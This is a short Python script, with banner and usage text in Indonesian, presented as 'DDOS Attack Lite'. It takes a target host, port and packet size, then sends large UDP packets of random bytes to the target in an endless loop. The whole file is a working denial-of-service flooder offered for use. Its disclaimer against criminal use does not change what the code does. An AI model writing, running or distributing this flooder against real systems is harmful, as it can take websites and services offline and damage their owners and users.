
"""Script yang kami buat bersifat OPEN SOURCE"""

import os, sys, time, socket, string, random
 
os.system('scroll')

print ("#----------------------------------------------------------------#")
print ("<|-------------------| DDOS Attack Lite |-----------------------|>")
print (" | Author:             RX77E, Security Syber Team Indonean      |")
print (" | Spesial Thank's:    RX77E                                    |")
print (" | Github:             https://github.com/Sreetx                |")
print (" | Instagram:          https://www.instagram.com/memelucubikin  |")
print (" |--------------------------------------------------------------|")
print (" |    Jangan gunakan script ini untuk tindak kejahatan. Kami    |")
print (" |    tidak bertanggung jawab atas apapun yang anda lakukan.    |")
print ("<|--------------------------------------------------------------|>")
print ("#----------------------------------------------------------------#")

try:
    host = sys.argv[1]
    port = sys.argv[2]
    paket = sys.argv[3]
    ip = socket.gethostbyname(host)
except IndexError:
    print (" [#] Info: Untuk pengguna dengan koneksi lambat, lebih baik langsung masukan ip di menu pertama")
    print ("\n [#] Ketikan "+sys.argv[0]+" https://namawebsite.com/ port paket")
    print (" [#] Misal "+sys.argv[0]+" https://namawebsite.com/ 80 100\n")
    sys.exit()

def ddos():
    try:
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 + int(paket))
        sent = 50000 + int(paket)
        ddos.connect((ip, int(port)))
        ddos.sendto(bytes, (ip, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
    except socket.error: print ("\n[!] Socket error... Max paket yg dapat dikirimkan 15500MB")

while True:
    ddos()

